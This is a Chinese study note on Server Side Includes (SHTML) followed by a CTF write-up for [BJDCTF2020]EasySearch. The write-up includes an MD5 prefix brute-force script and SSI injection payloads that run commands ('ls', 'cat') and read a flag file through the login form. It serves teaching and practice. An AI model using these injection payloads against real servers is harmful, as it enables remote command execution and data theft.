## shtml学习

> SHTML（Server Side Includes HTML）是一种基于HTML的标记语言，用于将服务器端动态内容嵌入到静态HTML页面中。SHTML文件通常以 `.shtml` 作为扩展名，而不是常规的 `.html`。它允许通过服务器端的脚本（如SSI，即服务器端包含）来动态生成或插入内容。

> SSI（Server Side Includes，服务器端包含）是一种在Web服务器端动态生成HTML内容的技术。它允许Web页面在被浏览器加载之前，在服务器端插入动态内容。SSI通常用于将静态HTML页面和动态内容结合，使得页面在服务器端动态生成一些内容（例如日期、时间、服务器信息或从其他文件中加载内容）而不需要完全生成动态网页。

示例：

```html
<!DOCTYPE html>
<html>
<head>
    <title>示例 SHTML 页面</title>
</head>
<body>
    <h1>欢迎来到我的网页!</h1>
    <!--#include virtual="footer.html" -->
</body>
</html>
```

`footer.html` 文件的内容会被服务器插入到 `<!--#include-->` 指令所在的位置。

### 常用SSI指令

**`#include`**：

- 这个指令用于将其他文件的内容嵌入到当前页面中。

- 例如：

  ```html
  <!--#include virtual="footer.html" -->
  ```

  上面的代码会将

  ```
  footer.html
  ```

  文件的内容插入到当前页面中。

**`#echo`**：

- 用于输出某个变量的值，比如环境变量、日期、时间等。

- 例如：

  ```html
  <!--#echo var="DATE_LOCAL" -->
  ```

  这会输出服务器的本地时间。

**`#exec`**：

- 用来执行外部程序或脚本，并将其输出插入到当前页面。

- 例如：

  ```html
  <!--#exec cmd="date" -->
  ```

  这会在页面中显示服务器的当前日期。

**`#if` / `#else` / `#endif`**：

- 这些指令用于条件判断，可以根据不同的条件显示不同的内容。

- 例如：

  ```html
  <!--#if expr="$QUERY_STRING = 'show=true'" -->
  <p>条件满足，显示内容。</p>
  <!--#else-->
  <p>条件不满足，显示其他内容。</p>
  <!--#endif-->
  ```

**`#set`**：

- 用来定义和设置变量的值，后续可以在页面中使用。

- 例如：

  ```html
  <!--#set var="username" value="John Doe" -->
  ```

### 题目

#### [BJDCTF2020]EasySearch

![image-20250118144747424](https://gitee.com/bx33661/image/raw/master/path/image-20250118144747424.png)

扫描发现存在index.php.swp，一个md5问题

```python
import hashlib

for i in range(9999999):
    if (hashlib.md5(str(i).encode('utf-8')).hexdigest()[:6] == '6d0bc1'):
        print(i)
        break

        #2020666
```

我们随便登录，抓包发现，可以访问shtml页面，开始我以为是模板注入

学习了之后发现

可以利用SSI执行命令：

```(空)
username=<!--#exec cmd="ls /"-->&password=2020666
username=<!--#exec cmd="ls ../"-->&password=2020666
username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2 "-->&password=2020666
```

最后得到flag

也可以利用包含语句

```(空)
<!--#include virtual="../flag_990c66bf85a09c664f0b6741840499b2" -->
```

